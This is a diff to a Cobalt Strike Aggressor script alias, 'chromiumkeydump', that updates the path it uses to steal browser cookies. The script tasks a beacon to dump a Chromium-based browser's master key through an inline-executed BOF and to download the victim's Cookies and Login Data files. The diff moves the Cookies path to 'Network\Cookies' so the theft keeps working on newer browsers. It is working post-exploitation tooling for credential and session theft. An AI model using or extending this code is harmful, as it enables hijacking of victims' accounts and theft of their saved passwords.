@@ -34,14 +34,14 @@ alias chromiumkeydump {
         beacon_inline_execute($bid, $data, "go", $args);
     } else if ($command eq "cookies") {
         btask($bid, "Tasked to download ".uc($browser)." Cookies file");
-        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Cookies");    
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Network\\Cookies");
     } else if ($command eq "logindata") {
         btask($bid, "Tasked to download ".uc($browser)." LoginData file");
         bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Login Data");    
     }else if ($command eq "all") {
         btask($bid, "Tasked to dump ".uc($browser)." Masterkey and download Cookies/LoginData");
         beacon_inline_execute($bid, $data, "go", $args);
-        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Cookies");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Network\\Cookies");
         bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Login Data");  
     } else {
         berror($bid, "Check parameters: help chromiumkeydump\n");
